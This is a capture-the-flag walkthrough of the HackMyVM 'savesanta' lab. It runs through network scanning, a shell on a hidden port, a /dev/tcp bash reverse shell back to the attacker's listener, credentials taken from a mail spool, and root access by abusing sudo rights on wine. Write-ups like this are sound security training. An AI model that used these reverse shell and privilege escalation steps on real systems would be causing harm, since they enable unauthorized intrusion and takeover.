# savesanta

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| savesanta | eMVee | Beginner | HackMyVM |

**Summary:** The vulnerability chain begins with standard network reconnaissance revealing a web server with hidden directories. Further web investigation uncovers a mechanism that exposes a hidden command interface on a nonstandard port. Accessing this port grants initial execution as a low privileged user. Extensive internal enumeration uncovers local mail communications containing plain text credentials for a secondary user account named bill. Transitioning to this account unlocks elevated execution rights through the Windows emulator known as Wine. By executing the Windows command prompt via Wine with superuser privileges, full root system compromise is achieved, enabling the retrieval of all target flags.

---

1. **Network Reconnaissance**
The assessment begins with a ping sweep across the local subnet to identify the target machine. The results highlight the target IP address.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 12:38 WIB
Nmap scan report for CLIENT-DESKTOP (192.168.100.1)
Host is up (0.0020s latency).
Nmap scan report for 192.168.100.2
Host is up (0.00095s latency).
Nmap scan report for 192.168.100.205
Host is up (0.0021s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.04 seconds
```

With the target identified, a comprehensive port scan is executed to map available services. The scan reveals an open Secure Shell port alongside a web server hosting a site for The Naughty Elves. The scan also identifies a robots text file containing several disallowed entries.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ nmap -sCV -p- -T4 192.168.100.205
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 12:38 WIB
Nmap scan report for 192.168.100.205
Host is up (0.0021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: The Naughty Elves
| http-robots.txt: 3 disallowed entries
|_/ /administration/ /santa
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds
```

To discover additional hidden content, a directory brute force attack is launched against the web server. This confirms the presence of the administration and santa directories found previously.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ gobuster dir -u http://192.168.100.205/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.205/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1012]
/media.html           (Status: 200) [Size: 1109]
/javascript           (Status: 301) [Size: 242] [--> http://192.168.100.205/javascript/]
/administration       (Status: 301) [Size: 246] [--> http://192.168.100.205/administration/]
/robots.txt           (Status: 200) [Size: 70]
/santa                (Status: 301) [Size: 237] [--> http://192.168.100.205/santa/]
/server-status        (Status: 403) [Size: 199]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

2. **Vulnerability Discovery and Initial Access**
Careful inspection of the web server content yields critical information. A specific detail found on the main web page indicates a method to unlock further access.

![](image.png)

Following the discovery of this information, a secondary port scan is performed. This reveals that port 63673 is now open and accessible.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ nmap -sCV -p- -T4 192.168.100.205
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 13:29 WIB
Nmap scan report for 192.168.100.205
Host is up (0.0023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Merry Christmas to everyone - Santa Claus
|_http-server-header: Apache
63673/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.14 seconds
```

A direct connection is established to this newly discovered port using netcat. The connection immediately drops into a shell operating under the user alabaster. Basic commands verify the user identity and home directory contents.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ nc 192.168.100.205 63673
id
uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
ls -la
total 36
drwxr-x---  4 alabaster alabaster 4096 Jan  4  2024 .
drwxr-xr-x 10 root      root      4096 May 23 06:25 ..
-rw-------  1 alabaster alabaster    0 Jan  4  2024 .bash_history
-rw-r--r--  1 alabaster alabaster  220 Dec 30  2023 .bash_logout
-rw-r--r--  1 alabaster alabaster 3771 Dec 30  2023 .bashrc
drwx------  2 alabaster alabaster 4096 Dec 30  2023 .cache
drwxrwxr-x  3 alabaster alabaster 4096 Dec 30  2023 .local
-rw-r--r--  1 alabaster alabaster  807 Dec 30  2023 .profile
-rw-rw-r--  1 alabaster alabaster   66 Jan  4  2024 .selected_editor
-rw-rw-r--  1 alabaster alabaster 1778 Dec 30  2023 user.txt
```

To establish a more stable working environment, a reverse shell is initiated. A listener is first prepared on the attacking machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell payload is then executed from the target machine back to the attacking listener.

```bash
bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
```

Once the connection is caught, the terminal is upgraded to a fully interactive session utilizing script and stty commands.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 53967
bash: cannot set terminal process group (2368): Inappropriate ioctl for device
bash: no job control in this shell
alabaster@santa:~$ which script
which script
/usr/bin/script
alabaster@santa:~$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
alabaster@santa:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/savesanta]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

alabaster@santa:~$ export SHELL=/bin/bash
alabaster@santa:~$ export TERM=xterm
```

3. **Internal Enumeration and Lateral Movement**
With a stable shell secured, internal enumeration commences to identify paths for privilege escalation. A search for writable files and directories across the file system highlights a local mail spool file for the current user.

```bash
alabaster@santa:~$ find / -type f -writable 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | grep -v "/snap/"
/var/mail/alabaster
/run/sendmail/mta/smsocket
/home/alabaster/.selected_editor
/home/alabaster/user.txt
/home/alabaster/.profile
/home/alabaster/.cache/motd.legal-displayed
/home/alabaster/.bash_logout
/home/alabaster/.bashrc
/home/alabaster/.bash_history
alabaster@santa:~$ find / -type d -writable 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | grep -v "/snap/"
/dev/mqueue
/dev/shm
/var/mail
/var/crash
/var/tmp
/run/screen
/run/lock
/home/alabaster
/home/alabaster/.local
/home/alabaster/.local/share
/home/alabaster/.local/share/nano
/home/alabaster/.cache
/tmp
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.font-unix
```

Inspecting the mail directory reveals a message sent from Santa to Alabaster. The email contains plain text credentials for a new user named bill. The provided password is JingleBellsPhishingSmellsHackersGoAway.

```bash
alabaster@santa:~$ cd /var/mail
alabaster@santa:/var/mail$ ls -la
total 16
drwxrwsrwt  2 root      mail 4096 May 23 06:37 .
drwxr-xr-x 14 root      root 4096 Dec 30  2023 ..
-rw-rw----  1 alabaster mail 1156 May 23 06:25 alabaster
-rw-------  1 root      mail 1436 May 23 06:37 root
alabaster@santa:/var/mail$ cat alabaster
From santa@santa.hmv  Sat May 23 06:25:02 2026
Return-Path: <santa@santa.hmv>
Received: from santa.hmv (localhost [127.0.0.1])
        by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 64N6P2SS002207
        for <alabaster@santa.hmv>; Sat, 23 May 2026 06:25:02 GMT
Received: (from santa@localhost)
        by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 64N6P2vq002206;
        Sat, 23 May 2026 06:25:02 GMT
From: Santa Claus <santa@santa.hmv>
Message-Id: <202605230625.64N6P2vq002206@santa.hmv>
Subject: Important update about the hack
To: <alabaster@santa.hmv>
User-Agent: mail (GNU Mailutils 3.15)
Date: Sat, 23 May 2026 06:25:02 +0000

Dear Alabaster,

As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible.

I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates.

His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next.

Please help Bill as much as possible so Christmas can go on!

- Santa
```

The system password file is queried to confirm the existence of the bill account.

```bash
alabaster@santa:/var/mail$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
santa:x:1000:1000:Santa Claus:/home/santa:/bin/bash
alabaster:x:1001:1001:Alabaster Snowball,,,:/home/alabaster:/bin/bash
sugurplum:x:1002:1002:Sugarplum Mary,,,:/home/sugurplum:/bin/bash
pepper:x:1004:1004:Pepper Minstix,,,:/home/pepper:/bin/bash
shinny:x:1005:1005:Shinny Upatree,,,:/home/shinny:/bin/bash
wunorse:x:1006:1006:Wunorse Openslae,,,:/home/wunorse:/bin/bash
bill:x:1007:1007::/home/bill:/bin/sh
```

Using the newly discovered credentials, the active session is switched to the user bill. A review of sudo privileges for this user shows that bill is permitted to execute the wine binary as root without requiring a password.

```bash
alabaster@santa:/var/mail$ su - bill
Password:
$ id
uid=1007(bill) gid=1007(bill) groups=1007(bill)
$ sudo -l
Matching Defaults entries for bill on santa:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bill may run the following commands on santa:
    (ALL) NOPASSWD: /usr/bin/wine
```

4. **Privilege Escalation**
The sudo permission configuration allows the execution of Windows applications through Wine with superuser privileges. Launching the Windows command prompt through this vector provides a shell operating as root within the Wine environment, which seamlessly maps back to the underlying Linux root filesystem.

```cmd
$ sudo wine cmd
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
0044:err:winediag:nodrv_CreateWindow Application tried to create a window, but no driver could be loaded.
0044:err:winediag:nodrv_CreateWindow L"The explorer process failed to start."
0044:err:systray:initialize_systray Could not create tray window
Microsoft Windows 6.1.7601

Z:\home\bill>whoami
0120:err:winediag:ntlm_check_version ntlm_auth was not found. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
0120:err:ntlm:ntlm_LsaApInitializePackage no NTLM support, expect problems
SANTA\root

Z:\home\bill>hostname
SANTA
```

Navigating to the root directory within the Wine command prompt confirms full system access.

```cmd
Z:\home\bill>cd /root

Z:\root>dir
Volume in drive Z has no label.
Volume Serial Number is 4afb-ec36

Directory of Z:\root

  1/4/2024  12:25 PM  <DIR>         .
12/30/2023   6:55 PM  <DIR>         ..
12/30/2023   8:10 PM         3,130  root.txt
12/30/2023   7:16 PM  <DIR>         snap
       1 file                     3,130 bytes
       3 directories      2,464,440,320 bytes free
```

Finally, both the user and root flags are read from their respective locations to conclude the assessment.

```cmd
Z:\root>type Z:\home\alabaster\user.txt
...
                HMV{f3f[REDACTED]}

Z:\root>type Z:\root\root.txt
...
                HMV{67d[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Network scanning identifies an active web server and hidden directories.
2. **Vulnerability Discovery**: Web content analysis reveals a trigger that opens a hidden network port.
3. **Exploitation**: Connecting to the newly opened port provides an initial shell as a standard user.
4. **Internal Enumeration**: File system searches uncover local mail containing credentials for lateral movement.
5. **Privilege Escalation**: Sudo privileges for the Wine emulator are abused to spawn a root level command prompt.
